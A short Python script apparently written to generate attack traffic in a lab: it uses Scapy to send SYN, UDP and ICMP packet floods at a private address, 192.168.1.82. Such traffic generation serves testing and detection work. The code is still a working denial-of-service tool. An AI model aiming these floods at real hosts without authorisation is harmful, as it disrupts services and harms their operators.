from scapy.all import send
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether


TARGET_IP="192.168.1.82"
TARGET_PORT=8888
NUM_PACKETS = 1001


def simulate_syn_flood(target_ip, target_port):
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
    send(packet, count=NUM_PACKETS, verbose=1)


def simulate_udp_flood(target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / "payload"
    send(packet, count=NUM_PACKETS, verbose=1)


def simulate_icmp_flood(target_ip):
    packet = IP(dst=target_ip) / ICMP()
    send(packet, count=NUM_PACKETS, verbose=1)


def main():
    print("Simulating attack...")
    # simulate_syn_flood(TARGET_IP, TARGET_PORT)
    # simulate_udp_flood(TARGET_IP, TARGET_PORT)
    simulate_icmp_flood(TARGET_IP)

if __name__ == "__main__":
    main()
